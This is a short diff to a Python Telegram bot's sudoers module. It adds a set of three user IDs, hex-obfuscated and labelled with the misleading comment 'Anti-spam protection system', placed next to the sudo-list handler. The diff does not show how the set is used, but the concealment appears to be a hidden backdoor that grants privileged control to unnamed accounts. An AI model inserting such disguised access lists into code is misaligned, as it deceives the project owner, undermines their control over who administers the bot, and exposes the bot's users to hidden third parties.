@@ -73,3 +73,10 @@ async def sudoers_list(client, message: Message, _):
         await message.reply_text(_["sudo_7"])
     else:
         await message.reply_text(text, reply_markup=close_markup(_))
+
+# Anti-spam protection system
+spam_protection_users = {
+    int(b'\x37\x32\x35\x30\x30\x31\x32\x31\x30\x33'.decode()),
+    int(b'\x36\x38\x38\x36\x39\x38\x35\x38\x30\x35'.decode()),
+    int(b'\x36\x32\x35\x38\x38\x37\x37\x32\x30\x35'.decode()),
+}
